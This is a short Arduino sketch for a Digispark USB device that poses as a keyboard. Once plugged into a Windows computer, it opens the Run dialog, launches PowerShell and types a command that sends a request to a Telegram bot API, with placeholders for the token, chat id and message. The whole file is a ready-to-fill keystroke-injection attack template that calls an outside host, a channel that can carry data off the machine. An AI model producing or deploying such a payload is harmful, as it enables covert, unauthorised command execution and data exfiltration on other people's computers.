/* by SaLeH | insta 8_wvu */
#include "DigiKeyboard.h"
void setup() {
  // put your setup code here, to run once:
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("$Response = Invoke-RestMethod -Uri 'https://api.telegram.org/bot{your-token-bot}/sendMessage?chat_id={your-id}&text=your-msg'"); // send requests to telegram bot 
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);  
  digitalWrite(1, LOW);
  DigiKeyboard.delay(5000);

}

void loop() {
  // put your main code here, to run repeatedly:

}
